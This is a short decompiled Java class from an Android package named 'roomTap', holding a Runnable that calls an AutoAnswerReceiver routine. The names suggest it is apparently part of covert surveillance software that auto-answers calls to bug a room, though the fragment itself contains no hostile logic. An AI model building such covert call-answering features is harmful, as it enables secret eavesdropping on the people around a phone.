package com.network.android.roomTap;

import android.content.Context;

final class c implements Runnable {

    /* renamed from: a  reason: collision with root package name */
    final /* synthetic */ Context f116a;
    final /* synthetic */ a b;

    c(a aVar, Context context) {
        this.b = aVar;
        this.f116a = context;
    }

    public final void run() {
        AutoAnswerReceiver.e(this.f116a);
    }
}
